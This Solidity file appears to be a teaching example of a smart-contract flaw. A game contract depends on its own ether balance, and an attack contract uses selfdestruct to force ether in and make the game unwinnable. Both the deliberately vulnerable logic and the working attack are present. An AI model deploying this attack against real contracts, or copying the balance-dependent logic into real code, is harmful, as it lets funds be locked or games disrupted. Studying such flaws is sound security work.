// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract EtherGame{
    uint targetamt=7 ether;
    address public  winner;
    function deposit()public  payable {
    require ( msg.value==1 ether,"you can onlysend 1 eth" );
    require(address(this).balance<=targetamt,"Game Over");
    if (address(this).balance == targetamt){
        (bool s,)=msg.sender.call{value:address(this).balance}("");
        require(s,"Failed");
    }
    


    }

}

contract AttackEthergame{
    EtherGame ethgame;
    constructor(address payable targetaddr){
        ethgame=EtherGame(targetaddr);
        
    }

    function attack()public payable {
        // in this attack we force to send the money to the smart contract ethgame so the no one is the winner
        address payable targetcontract= payable (address(ethgame));
        selfdestruct(targetcontract);
    }
}